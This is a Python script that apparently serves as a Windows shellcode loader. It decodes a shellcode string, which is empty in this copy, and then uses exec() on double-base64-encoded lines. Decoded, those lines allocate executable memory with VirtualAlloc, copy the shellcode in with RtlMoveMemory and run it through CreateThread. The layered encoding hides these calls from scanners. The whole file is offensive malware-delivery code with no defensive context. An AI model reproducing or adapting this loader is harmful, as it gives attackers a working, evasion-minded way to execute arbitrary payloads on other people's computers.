import ctypes
import codecs
import base64
import os


shellcode = ""


shellcode = shellcode.split(";")
shellcode = list(shellcode)


code = ""
for char in shellcode:
    if char.isdigit() == True:
        char = str(chr(int(char)))
        code = code + char
    if char == ":":
        char = "\\x"
        code = code + char
    if char.isdigit() == False and char != ":":
        code = code + char
shellcode = code.replace("\\x\\x", "\\x")



shellcode = shellcode.rstrip()
shellcode = shellcode.replace('"', '').replace('\n', '')
shellcode = shellcode.encode(encoding="utf-8")
exec(base64.b64decode(base64.b64decode("YzJobGJHeGpiMlJsSUQwZ1kyOWtaV056TG1WelkyRndaVjlrWldOdlpHVW9jMmhsYkd4amIyUmxLVnN3WFE9PQ==".encode("utf-8"))))
exec(base64.b64decode(base64.b64decode("YzJobGJHeGpiMlJsSUQwZ1lubDBaV0Z5Y21GNUtITm9aV3hzWTI5a1pTaz0=".encode("utf-8"))))
exec(base64.b64decode(base64.b64decode("WTNSNWNHVnpMbmRwYm1Sc2JDNXJaWEp1Wld3ek1pNVdhWEowZFdGc1FXeHNiMk11Y21WemRIbHdaU0E5SUdOMGVYQmxjeTVqWDNWcGJuUTJOQT09".encode("utf-8"))))
exec(base64.b64decode(base64.b64decode("Y0hSeUlEMGdZM1I1Y0dWekxuZHBibVJzYkM1clpYSnVaV3d6TWk1V2FYSjBkV0ZzUVd4c2IyTW9ZM1I1Y0dWekxtTmZhVzUwS0RBcExDQmpkSGx3WlhNdVkxOXBiblFvYkdWdUtITm9aV3hzWTI5a1pTa3BMQ0JqZEhsd1pYTXVZMTlwYm5Rb01IZ3pNREF3S1N3Z1kzUjVjR1Z6TG1OZmFXNTBLREI0TkRBcEtRPT0=".encode("utf-8"))))
exec(base64.b64decode(base64.b64decode("WW5WbUlEMGdLR04wZVhCbGN5NWpYMk5vWVhJZ0tpQnNaVzRvYzJobGJHeGpiMlJsS1NrdVpuSnZiVjlpZFdabVpYSW9jMmhsYkd4amIyUmxLUT09".encode("utf-8"))))
exec(base64.b64decode(base64.b64decode("WTNSNWNHVnpMbmRwYm1Sc2JDNXJaWEp1Wld3ek1pNVNkR3hOYjNabFRXVnRiM0o1S0dOMGVYQmxjeTVqWDNWcGJuUTJOQ2h3ZEhJcExDQmlkV1lzSUdOMGVYQmxjeTVqWDJsdWRDaHNaVzRvYzJobGJHeGpiMlJsS1NrcA==".encode("utf-8"))))
exec(base64.b64decode(base64.b64decode("YUdGdVpHeGxJRDBnWTNSNWNHVnpMbmRwYm1Sc2JDNXJaWEp1Wld3ek1pNURjbVZoZEdWVWFISmxZV1FvWTNSNWNHVnpMbU5mYVc1MEtEQXBMQ0JqZEhsd1pYTXVZMTlwYm5Rb01Da3NJR04wZVhCbGN5NWpYM1ZwYm5RMk5DaHdkSElwTENCamRIbHdaWE11WTE5cGJuUW9NQ2tzSUdOMGVYQmxjeTVqWDJsdWRDZ3dLU3dnWTNSNWNHVnpMbkJ2YVc1MFpYSW9ZM1I1Y0dWekxtTmZhVzUwS0RBcEtTaz0=".encode("utf-8"))))
exec(base64.b64decode(base64.b64decode("WTNSNWNHVnpMbmRwYm1Sc2JDNXJaWEp1Wld3ek1pNVhZV2wwUm05eVUybHVaMnhsVDJKcVpXTjBLR04wZVhCbGN5NWpYMmx1ZENob1lXNWtiR1VwTENCamRIbHdaWE11WTE5cGJuUW9MVEVwS1E9PQ==".encode("utf-8"))))
